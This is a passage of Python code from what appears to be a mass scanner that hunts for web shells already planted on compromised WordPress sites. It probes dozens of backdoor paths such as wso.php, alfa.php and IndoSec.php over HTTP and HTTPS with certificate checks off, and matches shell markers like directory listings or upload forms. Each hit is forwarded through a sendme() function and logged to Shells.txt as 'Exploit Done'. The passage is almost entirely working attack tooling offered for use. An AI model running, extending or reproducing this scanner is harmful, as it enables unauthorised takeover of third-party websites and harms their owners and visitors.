                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
     
 #32 /old-index.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/old-index.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/old-index.php")
            open("Shells.txt", "a").write(url + "/old-index.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/old-index.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/old-index.php")
                open("Shells.txt", "a").write(url + "/old-index.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))

#33 /wp-blog.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-blog.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-blog.php")
            open("Shells.txt", "a").write(url + "/wp-blog.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-blog.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-blog.php")
                open("Shells.txt", "a").write(url + "/wp-blog.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
     
 # 40 /data.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/data.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/data.php")
            open("Shells.txt", "a").write(url + "/data.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/data.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/data.php")
                open("Shells.txt", "a").write(url + "/data.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))     

#34 /wp-includes/embed-wp.php
            url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-includes/embed-wp.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if 'input type="submit" value="LOAD"' in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-includes/embed-wp.php")
            open("Shells.txt", "a").write(url + "/wp-includes/embed-wp.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-includes/embed-wp.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if 'input type="submit" value="LOAD"' in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-includes/embed-wp.php")
                open("Shells.txt", "a").write(url + "/wp-includes/embed-wp.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))

#35 /fw.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/fw.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/fw.php#")
            open("Shells.txt", "a").write(url + "/fw.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/fw.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/fw.php#")
                open("Shells.txt", "a").write(url + "/fw.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))             

#36 /x.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/x.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/x.php")
            open("Shells.txt", "a").write(url + "/x.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/x.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/x.php")
                open("Shells.txt", "a").write(url + "/x.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
    
#37 /c.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/c.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/c.php")
            open("Shells.txt", "a").write(url + "/c.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/c.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/c.php")
                open("Shells.txt", "a").write(url + "/c.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))

#38 /a.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/a.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/a.php")
            open("Shells.txt", "a").write(url + "/a.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/a.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/a.php")
                open("Shells.txt", "a").write(url + "/a.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))

#39 /css.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/css.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/css.php")
            open("Shells.txt", "a").write(url + "/css.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/css.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/css.php")
                open("Shells.txt", "a").write(url + "/css.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))                

#40 /wp-content/fw.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/fw.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-content/fw.php#")
            open("Shells.txt", "a").write(url + "/wp-content/fw.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/fw.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-content/fw.php#")
                open("Shells.txt", "a").write(url + "/wp-content/fw.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
        
#41 /wp-admin/fw.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-admin/fw.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-admin/fw.php")
            open("Shells.txt", "a").write(url + "/wp-admin/fw.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-admin/fw.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-admin/fw.php")
                open("Shells.txt", "a").write(url + "/wp-admin/fw.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
       
#42 /gank.php.PhP
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/gank.php.PhP", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/gank.php.PhP")
            open("Shells.txt", "a").write(url + "/gank.php.PhP")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/gank.php.PhP",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/gank.php.PhP")
                open("Shells.txt", "a").write(url + "/gank.php.PhP")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))    
       
#43 /doc.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/doc.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/doc.php")
            open("Shells.txt", "a").write(url + "/doc.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/doc.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/doc.php")
                open("Shells.txt", "a").write(url + "/doc.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))                  
      
 #65 /.Wp-back.phP
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/.Wp-back.phP", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/.Wp-back.phP")
            open("Shells.txt", "a").write(url + "/.Wp-back.phP")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/.Wp-back.phP",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/.Wp-back.phP")
                open("Shells.txt", "a").write(url + "/.Wp-back.phP")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))           
    
#44 /wso112233.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wso112233.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wso112233.php#")
            open("Shells.txt", "a").write(url + "/wso112233.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wso112233.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wso112233.php")
                open("Shells.txt", "a").write(url + "/wso112233.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr)) 

#45 /wp-admin/wso.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-admin/wso.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-admin/wso.php#")
            open("Shells.txt", "a").write(url + "/wp-admin/wso.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-admin/wso.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-admin/wso.php#")
                open("Shells.txt", "a").write(url + "/wp-admin/wso.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
     
#46 /wp-content/wso.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/wso.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-content/wso.php#")
            open("Shells.txt", "a").write(url + "/wp-content/wso.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/wso.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-content/wso.php#")
                open("Shells.txt", "a").write(url + "/wp-content/wso.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
     
#47 /wp-includes/wso.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-includes/wso.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-includes/wso.php#")
            open("Shells.txt", "a").write(url + "/wp-includes/wso.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-includes/wso.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-includes/wso.php")
                open("Shells.txt", "a").write(url + "/wp-includes/wso.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))

#48 /wp-admin/includes/logs.php
            url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-admin/includes/logs.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if 'input name=" Exploit Donefile" type="file"' in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-admin/includes/logs.php")
            open("Shells.txt", "a").write(url + "/wp-admin/includes/logs.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-admin/includes/logs.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if 'input name=" Exploit Donefile" type="file"' in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-admin/includes/logs.php")
                open("Shells.txt", "a").write(url + "/wp-admin/includes/logs.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))

#49 /wp-includes/pomo/treame.php
            url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-includes/pomo/treame.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if 'input class="Input" type="file" name="file_n[]"' in check.content.decode(
            "utf-8"
        ):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-includes/pomo/treame.php")
            open("Shells.txt", "a").write(url + "/wp-includes/pomo/treame.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-includes/pomo/treame.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if (
                'input class="Input" type="file" name="file_n[]"'
                in check.content.decode("utf-8")
            ):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-includes/pomo/treame.php")
                open("Shells.txt", "a").write(url + "/wp-includes/pomo/treame.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
           
#50 /wp-includes/ID3/vp.php
            url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-includes/ID3/vp.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if 'input type="submit" value="Upload"' in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-includes/ID3/vp.php")
            open("Shells.txt", "a").write(url + "/wp-includes/ID3/vp.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-includes/ID3/vp.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if 'input type="submit" value="Upload"' in check.content.decode("utf-8"):
                print(
                    "\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg)
                )
                sendme(url + "/wp-includes/ID3/vp.php")
                open("Shells.txt", "a").write(url + "/wp-includes/ID3/vp.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
    
#51 /.well-known/acme-challenge/Alfa.php
            url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/.well-known/acme-challenge/Alfa.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/.well-known/pki-validation/atomlib.php")
            open("Shells.txt", "a").write(
                url + "/.well-known/pki-validation/atomlib.php"
            )
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/.well-known/pki-validation/atomlib.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/.well-known/pki-validation/atomlib.php")
                open("Shells.txt", "a").write(
                    url + "/.well-known/pki-validation/atomlib.php"
                )
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
    
#52 /.well-known/acme-challenge/atomlib.php
            url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/.well-known/acme-challenge/atomlib.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/.well-known/acme-challenge/atomlib.php")
            open("Shells.txt", "a").write(
                url + "/.well-known/acme-challenge/atomlib.php"
            )
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/.well-known/acme-challenge/atomlib.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/.well-known/acme-challenge/atomlib.php")
                open("Shells.txt", "a").write(
                    url + "/.well-known/acme-challenge/atomlib.php"
                )
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
    
#53 /mt/pekok.php
            url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/mt/pekok.php", headers=headers, allow_redirects=True, timeout=15
        )
        if '<input type="submit" value="upload" />' in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/mt/pekok.php")
            open("Shells.txt", "a").write(url + "/mt/pekok.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/mt/pekok.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if '<input type="submit" value="upload" />' in check.content.decode(
                "utf-8"
            ):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/mt/pekok.php")
                open("Shells.txt", "a").write(url + "/mt/pekok.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
     
#54 /wp-includes/widgets/class-wp-widget-index.php
            url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-includes/widgets/class-wp-widget-index.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-includes/widgets/class-wp-widget-index.php")
            open("Shells.txt", "a").write(
                url + "/wp-includes/widgets/class-wp-widget-index.php"
            )
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-includes/widgets/class-wp-widget-index.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-includes/widgets/class-wp-widget-index.php")
                open("Shells.txt", "a").write(
                    url + "/wp-includes/widgets/class-wp-widget-index.php"
                )
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
    
#55 /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(
                url
                + "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
            )
            open("Shells.txt", "a").write(
                url
                + "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
            )
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url
                + "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(
                    url
                    + "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
                )
                open("Shells.txt", "a").write(
                    url
                    + "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
                )
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
     
#56 /wp-admin/alfa.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-admin/alfa.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-admin/alfa.php")
            open("Shells.txt", "a").write(url + "/wp-admin/alfa.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-admin/alfa.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-admin/alfa.php")
                open("Shells.txt", "a").write(url + "/wp-admin/alfa.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
      
#57 /edit-form.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/edit-form.php", headers=headers, allow_redirects=True, timeout=15
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/edit-form.php")
            open("Shells.txt", "a").write(url + "/edit-form.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/edit-form.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/edit-form.php")
                open("Shells.txt", "a").write(url + "/edit-form.php")
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
      
#58 /wp-content/uploads/wp-logout.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/uploads/wp-logout.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if 'input type="submit" value="upload"' in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-content/uploads/wp-logout.php")
            open("Shells.txt", "a").write(url + "/wp-content/uploads/wp-logout.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/uploads/wp-logout.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if 'input type="submit" value="upload"' in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-content/uploads/wp-logout.php")
                open("Shells.txt", "a").write(
                    url + "/wp-content/uploads/wp-logout.php"
                )
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
   
#59 /wp-content/themes/sketch/404.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/themes/sketch/404.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-content/themes/sketch/404.php")
            open("Shells.txt", "a").write(url + "/wp-content/themes/sketch/404.php")
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/themes/sketch/404.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-content/themes/sketch/404.php")
                open("Shells.txt", "a").write(
                    url + "/wp-content/themes/sketch/404.php"
                )
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
       
#60 /wp-content/themes/twentyfive/include.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/themes/twentyfive/include.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-content/themes/twentyfive/include.php")
            open("Shells.txt", "a").write(
                url + "/wp-content/themes/twentyfive/include.php"
            )
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/themes/twentyfive/include.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-content/themes/twentyfive/include.php")
                open("Shells.txt", "a").write(
                    url + "/wp-content/themes/twentyfive/include.php"
                )
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
  
#61 /wp-content/uploads/ac_assets/IndoSec.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/uploads/ac_assets/IndoSec.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "{ INDOSEC }" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-content/uploads/ac_assets/IndoSec.php")
            open("Shells.txt", "a").write(
                url + "/wp-content/uploads/ac_assets/IndoSec.php"
            )
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/uploads/ac_assets/IndoSec.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "{ INDOSEC }" in check.content.decode("utf-8"):
                print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
                sendme(url + "/wp-content/uploads/ac_assets/IndoSec.php")
                open("Shells.txt", "a").write(
                    url + "/wp-content/uploads/ac_assets/IndoSec.php"
                )
            else:
                print(">>>" + url + " --> {}[ Exploit Fail]".format(fr))
       
#62 /wp-content/themes/classic/inc/index.php
        url = "http://" + URLdomain(url)
        check = requests.get(
            url + "/wp-content/themes/classic/inc/index.php",
            headers=headers,
            allow_redirects=True,
            timeout=15,
        )
        if "drwxr-xr-x" in check.content.decode("utf-8"):
            print("\\033[0;32m>>>" + url + " --> {}[ Exploit Done]".format(fg))
            sendme(url + "/wp-content/themes/classic/inc/index.php")
            open("Shells.txt", "a").write(
                url + "/wp-content/themes/classic/inc/index.php"
            )
        else:
            url = "https://" + URLdomain(url)
            check = requests.get(
                url + "/wp-content/themes/classic/inc/index.php",
                headers=headers,
                allow_redirects=True,
                verify=False,
                timeout=15,
            )
            if "drwxr-xr-x" in check.content.decode("utf-8"):
